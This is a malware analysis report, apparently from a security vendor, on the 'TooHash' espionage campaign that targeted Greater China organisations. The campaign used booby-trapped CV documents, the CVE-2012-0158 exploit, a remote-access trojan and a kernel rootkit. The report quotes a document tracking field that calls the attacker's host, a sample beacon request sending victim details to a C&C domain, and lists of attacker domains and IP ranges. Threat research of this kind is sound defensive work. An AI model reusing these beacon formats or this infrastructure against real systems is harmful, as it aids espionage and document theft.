The purpose of this campaign was to steal valuable documents from the targeted\nentity. We entitle this operation “TooHash”.\n\nThe attackers’ modus operandi is to carry out spear phishing using a malicious Microsoft Office document as an\nattachment. The attackers do not choose their targets indiscriminately, which we derive from the fact that they\nsent specially crafted CV documents, probably to human resources management employees. Naturally, the\nrecipients are inclined to open such documents on a daily base.\n\nThe majority of discovered samples were submitted from Taiwan. As part of the documents are in Simplified\nChinese which is used in the Chinese mainland and others in Traditional Chinese which is used in Hong Kong,\nMacao and Taiwan, these malicious documents might have been used against targets in the whole Greater China\narea.\n\n##### The Malware used\n\n[The attached documents exploit a well-known and rather aged vulnerability (CVE-2012-0158) to drop a remote](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158)\nadministration tool, or RAT for short, onto the targeted user’s computer. During the campaign, we identified two\ndifferent pieces of malware. Both include common cyber-espionage components such as code execution, file\nlisting, document exfiltration and more.\n\nWe discovered more than 75 command and control servers, all used to administrate infected machines. The\nservers were mainly located in Hong Kong and the USA. Furthermore, the administration panel’s language, used\nby the attackers to manage infected systems, was partly written in Chinese and partly in English.\n\nThe exploit used by the attackers is identified and blocked by G DATA’s Exploit Protection technology and\nG DATA’s security solutions detect the dropped binaries as Win32.Trojan.Cohhoc.A and Win32.Trojan.DirectsX.A\nrespectively.\n\n##### Information Stealing \n\nNowadays, trade secrets describe one of the major values of almost every company. Therefore, begrudged\ncompetitors may be tempted to steal valuable sensitive information for their purposes. The leak of sensitive\ndocuments can be a disaster for a company and lead to large financial losses. Furthermore, governmental entities\nuse sensitive, private or classified documents. Intelligence agencies may be interested to obtain such documents.\n\n\n-----\n\n#### Campaign Analysis\n\n##### Targets \n\nThe analyzed samples used in the “TooHash” campaign were Microsoft Office documents, and were submitted to\nus from a Taiwanese customer.\n\nAn indication leading to the target area is one of the documents used by the attackers, which contained the string\n“102年尾牙、” which means “end of the year 102”. The official calendar used in Taiwan starts in 1912 (year 1), so\nthe year 102 is the year 2013 according to the Gregorian calendar (1911+102=2013).\n\nWe conclude that the targets are entities located in the Greater China area and on the name of another document\nused by the attacker called 李辉简历.doc which translates to “resume of Li Hui”.\n\nAnother lead, suggesting that the attacks occurred in the Greater China area, is the fact that the majority of\nsamples available on VirusTotal were originally submitted from Taiwan.\n\nThe DNS-name of the C&C server contained information about affected companies. Here is a list of some targeted\nentities:\n\n Public research organization\n Space research organization\n Telecom companies\n Private companies\n\n##### Spear Phishing Campaign\n\nTo drop the malware onto the targeted computer and to control the system, the attackers chose to carry out a\nspear phishing campaign. This campaign comprised a Microsoft Office document being sent to the victim. A\nprobable entry point for a manipulated CV would be an HR department. If the document is opened with an\noutdated Microsoft Office version, malware is installed by exploiting vulnerability [CVE-2012-0158.](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158)\n\nTo appear credible, the attackers selected the targeted users and the type of the attached documents cleverly. For\nexample, a Microsoft Office Word document called resume of Li Hui.doc. The document title as well as\nthe content was written in Simplified Chinese. The titles of the attacking documents involved are as follows:\n\n 文件列表.xls (file list) [Simplified Chinese]\n 李辉简历.doc (resume of Li Hui) [Simplified Chinese]\n\n 102年尾牙、103年春酒精緻菜單.xls (End of the year 102, year 103 Spring Menu) [Traditional Chinese]\n\n##### The Exploit used\n\nTo explain the exploit used, we have a look at the Word document, the ostensible CV. The mentioned exploit\ncauses Microsoft Word to crash, which might alert attacked users just right away. In our case, the attackers crafted\ntheir malicious document in a special way to conceal the software crash: The malicious .doc causes a crash, but\nmoments after the crash a legitimate Word session opens up and, to the user, everything appears to be normal.\nNevertheless, cautious users might suspect malicious actions behind such activities and notify security staff.\n\nThe CV that comes with the legitimate Word document (Wo.doc) is written in Chinese characters and style used\nin the Chinese mainland. Nevertheless, this sample has also been submitted to us from Taiwan.\n\n\n-----\n\n**_Screenshot 1: Screenshot of the legitimate document which opens after “resume of Li” exploited Word_**\n\n##### Tracking System\n\nThe resume visible to the user (Wo.doc) holds a tracking mechanism: Li Hui’s picture, visible in the document as\nthe blank square on the right hand side, is not stored locally but stored on the Internet. The following tag, inside\nthe document, reveals this function:\n\n\n**_Screenshot 1: Screenshot of the legitimate document which opens after “resume of Li” exploited Word_**\n\n```\n{ \nINCLUDEPICTURE\n\"http://mymail2.kmdns.net/track/ms.asp?key=jianli&AAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\" \\*\nMERGEFORMAT \\d\n}\n\n```\n\nAs soon as the document is loaded, a network query is performed and notifies the attacker about the successful\nexploit and the availability of a newly infected machine.\n\nWe identified two types of malware used to administrate the infected machines: Cohhoc and DirectsX. The first\none is a “classic” Remote Administration Tool. The second one is more advanced and of a different kind, the\nmalware is a rootkit. It is executed in kernel mode.\n\nThe RAT and the rootkit both share the same command and control infrastructure.\n\n\n-----\n\n#### Malware Analysis 1: “Cohhoc”, the RAT\n\n##### Components\n\nThe malware is divided into three parts:\n\n Component 1: the dropper, used to install the second component into a specific directory and to execute it.\nThis first file is removed after the execution of the second component;\n Component 2: a binary, used to unpack the third component and to execute it;\n Component 3: the payload; this is the real malicious part, the core of the malware.\n\nThe second component is installed into a subfolder of the directory %APPDATA% (for example in\n```\n%APPDATA%\\Microsoft\\). Known file names for the files used during the campaign discussed:\nsvchost.exe and conime.exe.\n\n```\nThe second component works similarly:\n\n It decrypts the payload. The payload is encrypted with AES. We identified different keys for different\nsamples.\n It then loads the decrypted payload into the memory. Once decrypted, the payload is a Windows dynamic\nlibrary (.dll).\n It executes the loaded library.\n\nIn case you are interested in information regarding the unpacking of this malware, please feel free to contact us\nusing toohash.securityblog@gdata.de\n\n##### Variants\n\nDuring the TooHash campaign, we were able to identify two variants of “Cohhoc”. Those two versions can be\ndistinguished by looking at the creation of the respective mutex after the malware is started:\n\n `H2_COMMON_DLL (before September 2013)`\n `NEW_H2_COMMON_DLL (after September 2013)`\n\n**_Screenshot 2: Mutex creation_**\n\nThe main difference between the two malware variants is the handling of the payload (component three). In the\nearlier version, the payload is located within a resource inside component two. In the later version, the payload is\n\n\n-----\n\nan additional file. This additional file is stored in the same directory as the second component and its name is\n```\nbrndlog.\n\n```\nAs small as this difference seems to be for a normal computer user, from a malware analyst’s point of view, it is a\nhuge difference. If, in the first case, the sample was found within a sample database, the analyst would be able to\nextract the payload and to analyze it right away. However, in the second case, the analyst cannot extract and\nanalyze the payload at all. In this context, the second component alone is rather useless; one needs to find the\nbinary which installs the payload. Furthermore, it is rather complex to create signature detection for an encrypted\nfile, such as the payload discussed.\n\n##### Persistence\n\nPersistence is ensured by the creation of a shortcut file (.lnk)\nin the Start Menu folder. This shortcut is labeled as\n```\nInternet Explorer .lnk. The blank space just\n\n```\nbefore the file name extension was inserted to trick the user.\nThe text looks exactly like the original without the additional\nspace. Furthermore, it is not only the file’s name which\nsidetracks, but also the icon used for this link comes in the\ndisguise of Microsoft’s Internet Explorer. The screenshot\nbelow reveals that the actual file behind this shortcut points\nto a different program: conime.exe:\n\n##### Features\n\nThe “Cohhoc” malware is a Remote Administration Tool and\nis able to:\n\n\n execute commands or scripts;\n download files;\n upload files;\n collect information about the infected system, for\nexample hostname, username, version of the\noperating system, installed software;\n find specific documents in order to send them to the\n\ncommand and control servers.\n\n\n**_Screenshot 3: Shortcut, used to guarantee persistence_**\n\n\n**_Screenshot 3: Shortcut, used to guarantee persistence_**\n\n\nWithin the samples, we found two different hardcoded command and control servers and a feature to easily\nchoose an alternative server. If the file %APPDATA%\\Adobe\\ActiveX.dat exists on the system, the\nmalware uses the server listed in this file instead of the hardcoded servers. The content in the file must use the\nobfuscation system described in the next chapter.\n\nThis approach, using an extra file with server information, proves to be particularly useful for the attackers, as they\ndo not have to transmit new payload to the infected system. Furthermore, it keeps analysts in the dark about\nadditional C&Cs in case they only see the .dat file. This file alone is rather useless. We have seen the same\ntechnique when looking at the differences between the two malware variants before.\n\n\n-----\n\n##### Obfuscation Layer\n\nThe “Cohhoc” malware uses an obfuscation layer, to disguise the malware and to complicate the analysis. The\nobfuscation is used:\n\n to encode the command and controls;\n to encode the data sent to the command and controls (information and documents);\n to decode the data received from the command and controls (the commands).\n\n**_Screenshot 4: Algorithm used to encode the data_** **_Screenshot 5: Algorithm used to decode the data_**\n\nThis algorithm can easily be adapted in C language. Fellow researchers are welcome to receive the code after\ncontacting samplerequest@gdata.de.\n\nTo be readable and easily usable, the base64 encoded data (in binary format) is converted into ASCII. Here is an\nexample to decode a command and control:\n\n\n**_Screenshot 4: Algorithm used to encode the data_**\n\n```\npaul@gdata:~$ echo 3d3duIWRvYmVzZXJ2aWNlbi5ldE= | base64 -d |\n./obfuscation –d\nwww.adobeservice.net\n\n```\n\n##### Network Communication\n\nThe malware uses HTTP to communicate to the command and control servers. Here is an example of a request\nperformed by an infected system:\n\n\n**_Screenshot 5: Algorithm used to decode the data_**\n\n```\nGET\n\n```\n```\n/CgAAAAAAAABhAAAAYQAAAMjAxNCA1MiRgNzEzIDMzNAxhcHRvcExhYkAAAAAADGFwdG9wTGF\niXHBhdWxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABdpbmRvd3NY\nUEAAADEwHHExHHEwAAAAAAo\n\n```\n```\nHTTP/1.1\n\n```\n```\nX-MU-Session-ID: 765592219\n\n```\n```\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\n\n```\n```\nAccept-Language: en-us\n\n```\n```\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;\nInfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR\n3.5.30729; .NET4.0C; .NET4.0E)\n\n```\n\n-----\n\n```\nHost: www.adobeservice.net\n\n```\n```\nConnection: Keep-Alive\n\n```\n```\nCache-Control: no-cache\n\n```\n```\nPragma: no-cache\n\n```\n\nThe relevant data is placed after the GET request. Here is the content of the request, decoded by using the code\nmentioned above:\n\nHere are the different parts of the data transmitted:\n\n Green: the current date and time;\n Pink: the hostname of the infected machine;\n Blue: the domain and the username of the infected machine;\n Yellow: the version of the operation system;\n Red: a hardcoded string which means “end of message”.\n\n```\npaul@gdata:~ $ cat CgAAAAAAAABhAAAAYQAAAMj[…] |base64 -d | ./common –d |\ncat -e\nM-^B^@^@^@^@^@^@^@X^@^@^@X^@^@^@2014 52d 713\n334LaptopLab^@^@^@^@^@LaptopLab\\paul^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@WindowsXP^@^@^@10\\11\\10^@^\n@^@^@$\n\n```\n\n-----\n\n#### Malware Analysis 2: “DirectsX”, the Rootkit\n\n##### Dropper\n\nThe dropper is used to install two files and the persistence mechanism. The two files are DirectsX.sys (the\nmalicious driver) and directsx (without any extension). The second file is the encoded payload used by the\ndriver.\n\nThe persistence mechanism is realized by the creation of a service. The installed file and the registry modifications\nare stored in a resource within the dropper. Here is a screenshot of the registry key created:\n\n**_Screenshot 6: Persistence mechanism_**\n\n##### Binary Signature\n\nThe dropper and the driver are both signed by a legitimate certificate. The certificate is owned by “Jiangxi you ma\nchuang da software technology Co., LTD”, has been reported stolen and is known to have been used in APT\nattacks. Here is a screenshot of the certificate:\n\n**_Screenshot 7: Use of a stolen certificate_**\n\n\n**_Screenshot 7: Use of a stolen certificate_**\n\n\n-----\n\n##### The Driver\n\nThe main purpose of the driver is to decode the content of the directsx file and to inject the payload into a\nuserland process. The algorithm used to encode the data in the file is a XOR followed by a SUB:\n\n**_Screenshot 8: Obfuscation algorithm_**\n\nThe values of the XOR and the SUB can be different. The decoding file contains the configuration (command and\ncontrol) and a library (.dll) to inject in userland. Here is an example of configuration:\n\n**_Screenshot 9: Example of configuration_**\n\nActually, the library is injected into the process of BitDefender (seccenter.exe), ZoneAlarm\n(svchost.exe) or 360 (360tray.exe), which means that three popular security products are abused. If the\nprocesses are not running on the infected system, the injection is performed into explorer.exe. To perform the\ninjection, the driver uses the API KeStackAttachProcess(). This function allows it to attach the current\nthread to an address space of a userland process.\n\nThe name of the rootkit is linked to its device name: \\\\device\\DirectsX and its symbolic name:\n```\n\\\\DosDevices\\DirectsX.\n\n```\n\n**_Screenshot 9: Example of configuration_**\n\n\n-----\n\n##### Injected dll\n\nThe injected dll is signed with the same certificate, too. It is the remote administration tool itself, injected by the\nrootkit. The tool allows the attackers:\n\n to execute code on the infected system;\n to download files;\n to get information about the infected system;\n to steal data such as Office documents or media files.\n\nThis library is a variant of a remote administration tool also known as Savit.\n\n#### Command and Control Servers\n\nWe identified more than 75 different servers. The complete list of domains is available in the appendix. The IP\nresolved by the domains changed frequently. At the time of writing this report, all known C&C servers were mainly\nlocated in Hong Kong, with three different host companies:\n\n HONGKONG LONG LIVE NETWORK CO LIMITED\n ASIA PACIFIC SERVER COMPANY (HK)\n Simcentric Solution (HK)\n\nA fourth host company used was located in the US:\n\n Ethrn.Net LLC (USA)\n\nThe IP ranges used by then:\n\n 103.228.64.0/24\n 111.68.3.0/24\n 112.121.160.0/18\n 180.178.32.0/18\n 216.83.32.0/19\n\nThe choice of domain names was made to trick the users or the security team during their analysis of the web logs\ncollected. Have a look at two examples used during the TooHash campaign:\n```\n *.cnnic-micro.com\n\n```\nCNNIC is the acronym for China National Network Information Center. It is the administrative agency for\nthe Internet domain administration in mainland China. The domain above is, of course, not owned by\nCNNIC.\n```\n *.adobeservice.net\n\n```\nthe domain seems to be related to Adobe Systems Incorporated, the popular software company. But,\nunfortunately, the domain is not owned by Adobe either.\n```\n *.intarnetservice.com\n\n```\nthe domain seems to be a legitimate intranet network, but note the typo in the domain name.\n```\n *.webmailerservices.com\n *.proxydomain.org\n *.privnsb.com\n\n```\n\n-----\n\nFor each domain, the attackers add a subdomain, the subdomain is generally assumed to be the name (or the\nacronym) of the targeted entities. Here is an example: nspo.intarnetservices.com. This could, in the\ncontext of the Greater China area, stand for the National Space Organization located in Taiwan.\n\nThe attackers control infected machines with the help of web servers installed on the C&Cs, they do not need to\nhave remote access. Here is the authentication page of the administration panel and aswe can see, the panel is\npartly written in Simplified Chinese:\n\n**_Screenshot 10: Authentication on the administration panel_**\n\n\n#### Attribution\n\nWe did not clearly identify the people behind this campaign. The use of the stolen certificate could point the\nShiqiang group, but nothing can be proven.\n\nAnyway, in our case, the attackers clearly targeted private business and governmental organizations as well. Either\nthe group decided to target governmental entities as well or the stolen certificate is used by several groups.\n\nIn any case, the attackers are well organized and use a huge and complex infrastructure to manage the infected\nsystems. Furthermore, they use two different malware types in order to always have access to the targeted\norganizations even if one malware is detected. The second malware becomes a spare wheel. We assume that the\npeople behind the group are professionals.\n\n#### Conclusion\n\nThis campaign showed us once more, that people do not hesitate to use sophisticated and deceptive methods to\nsteal data from companies or governmental organizations. The files submitted to us seem to have targeted\ncompanies in the Greater China area but this technology can easily be used against organizations in other\ncountries and regions across the globe. Due to the increasing value of nowadays’ trade secrets and political\nsecrets, we believe that the use of this kind of sponsored campaign is very likely to increase in the future.\n\nCompanies and other entities as well need to increase their security measures and to educate the users about the\nrisks they might encounter while working with a computer – ranging from social engineering to malware attacks,\netc.\n\nThe exploits used during this campaign are detected by G DATA’s exploit protection system and the files involved\nare detected by our antivirus engines.\n\nIn case you would like to receive further technical information or would like to contribute any information to this\ncase, please feel free to contact us by using the following email address: toohash.securityblog@gdata.de\n\n\n**_Screenshot 10: Authentication on the administration panel_**\n\n\n-----\n\n#### Appendix: IOC\n\n##### Hashes\n\n**Documents (and the original name):**\n```\n 8d263d5dae035e3d97047171e1cbf841 (102年尾牙、103年春酒精緻菜單.xls)\n 7251073c67db6421049ee2baf4f31b62 (李辉简历.doc)\n 2ec306ef507402037e9c1eeb81276152 (文件列表.xls)\n 6b83319cf336179f2105999fe586242c (Wo.doc)\n\n```\n**Cohhoc samples:**\n```\n 0c0a3784c3530e820f57da076ea1fc8b\n b45caf646f94ace23cfa367c5d202944\n d4691e06bca3a32c9283d2787b0e40b3\n bf4e5e6bef4acc33aea06f770407477e\n caf3e9500934f89ae4ddf3c6b093af23\n f87e765e583e1ead4e0dd56430c469fd\n 0ad60b49fc47581d19ca2f4e2fc6a6bb\n 12ee78564ebcb5e203d2991d5ac21ace\n 1ed0286b4967d9590900faadab8a4926\n 205e00d44ec0ff5f5c737fa4553e387a\n 272f23dce6d07f1be9bf2669b99e1530\n 2e1a5d92343fce92136592f208ca7160\n 2e4c52e2f424a233f0d5cfa143b4778f\n 3415e9e50be4de0903d607a2514b23e5\n 367ad9dd9e263a55d2820b88910b336a\n 39c5f3f134520bfb70a770de61185d49\n 3bd5de1f1cd29171709358920d311018\n 4afda3513ef0f5563f1e77f01dbaed7c\n 6b5e9eb8eccfd4336ff8910f646dd199\n 74697ae5fa114222d8d7f8442e57305d\n a3355ad88ba0802be7e4db0a68394718\n a7a40f633e3edc3e36e1dd27c57374b1\n b9ea262ac271a72a5310bd0d0561b007\n bf4fc457359c6396a360202eee2cc29f\n e0ee55a01de565ee145ed769ca3deddd\n f035bce5e0a7e570743c128927a026e1\n fd11d2f0f1d388404de4bb8d872ac897\n\n```\n**DirectsX samples:**\n```\n 22b955536f27b397f68f22172f8496c2\n ecc8245568b5dc1d74d0be6073eafa2d\n 2857455281e50a80593708e63d68c48f\n 5ebd4452848879202414a46a09cd2eab\n ed416eda209e91079a829cc97d57e287\n d4e2aadbc0ac414ac5a778da67251c02\n\n```\n\n-----\n\n##### Cohhoc File names\n```\n %USERPROFILE%\\Start Menu\\Programs\\Startup\\Internet Explorer .lnk\n %APPDATA%\\Roaming\\Microsoft\\Windows\\Start\n Menu\\Programs\\Startup\\Internet Explorer .lnk\n %APPDATA%\\Adobe\\ActiveX.dat \n %APPDATA%\\Adobe\\ActiveX.bat \n %APPDATA%\\Microsoft\\conime.exe \n %APPDATA%\\Microsoft\\conime.exe.en \n %TEMP%\\svchost.exe \n %TEMP%\\war.exe \n %TEMP%\\Wo.doc\n\n DirectsX - File names\n %SystemRoot%\\System\\directsx.sys\n %CommonProgramFiles%\\System\\directsx\n\n DirectsX - Device\n \\\\Device\\DirectsX\n\n DirectsX - Symlink\n \\\\DosDevices\\DirectsX\n\n DNS\n *.cnnic-micro.com\n *.proxydomain.org\n *.dyndns-office.com\n *.kmdns.net\n *.privnsb.com\n *.adobeservice.net\n *.webmailerservices.com\n *.intarnetservice.com\n\n IPs\n\n```\nIn case you wish to have information about the IPs involved, please get in touch with us via\ntoohash.securityblog@gdata.de\n\n\n-----",
